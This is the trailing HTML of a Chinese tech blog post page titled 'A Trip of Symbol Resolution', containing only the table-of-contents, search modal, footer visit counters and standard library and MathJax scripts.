  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
    </div>
    
  <div>
    
      <!-- 不蒜子统计PV -->
      
      <span id="busuanzi_container_site_pv" style="display: none">
      总访问量 <span id="busuanzi_value_site_pv"></span> 次
    </span>
    
    
      <!-- 不蒜子统计UV -->
      
      <span id="busuanzi_container_site_uv" style="display: none">
      总访客数 <span id="busuanzi_value_site_uv"></span> 人
    </span>
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
<script src="/js/main.js"></script>


  <script src="/js/lazyload.js"></script>



  
  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>







  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<!-- Plugins -->



  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "A Trip of Symbol Resolution&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>



  

  
    <!-- MathJax -->
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
          tex2jax: {
              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
              processEscapes: true,
              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
          }
      });

      MathJax.Hub.Queue(function() {
          var all = MathJax.Hub.getAllJax(), i;
          for(i=0; i < all.length; i += 1) {
              all[i].SourceElement().parentNode.className += ' has-jax';
          }
      });

    </script>

    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->

  










</body>
</html>
